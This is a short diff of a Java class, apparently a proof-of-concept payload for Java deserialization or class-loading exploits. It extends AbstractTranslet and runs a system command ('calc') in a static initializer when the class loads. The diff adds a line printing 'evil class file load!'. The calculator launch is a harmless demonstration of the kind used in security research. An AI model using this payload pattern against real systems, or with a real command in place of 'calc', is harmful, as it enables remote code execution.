@@ -11,6 +11,7 @@ import java.io.IOException;
 public class ExpClassLoad extends AbstractTranslet {
     static {
         try {
+            System.out.println("evil class file load!");
             Runtime.getRuntime().exec("calc");
         } catch (IOException e) {
             e.printStackTrace();
